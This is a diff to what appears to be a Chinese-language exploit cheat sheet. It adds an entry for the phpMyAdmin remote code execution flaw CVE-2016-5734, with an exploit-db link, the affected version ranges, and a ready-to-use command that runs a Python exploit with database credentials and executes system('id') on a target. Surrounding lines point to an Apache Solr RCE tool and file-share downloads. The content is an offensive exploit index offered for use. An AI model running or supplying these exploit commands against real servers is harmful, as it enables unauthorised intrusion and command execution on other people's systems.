@@ -2,6 +2,16 @@
 http://k8gege.org/p/ab3e87f7.html
 https://pan.baidu.com/s/1cpcQeE (需要登入百度網盤)
 
+# phpmyadmin(CVE-2016-5734)
+https://www.exploit-db.com/exploits/40185
+影響範圍 :
+4.0.10.16 之前 4.0.x 版本
+4.4.15.7 之前 4.4.x 版本
+4.6.3 之前 4.6.x 版本
+use :
+python3 CVE-2016-5734.py -u root -p root -d test http://targetip:port/ -c "system('id');"
+注: 必須知道資料庫帳號密碼
+
 # Apache Solr
 https://github.com/c1aysec/Apache-Solr-RCE
 影響範圍 : 
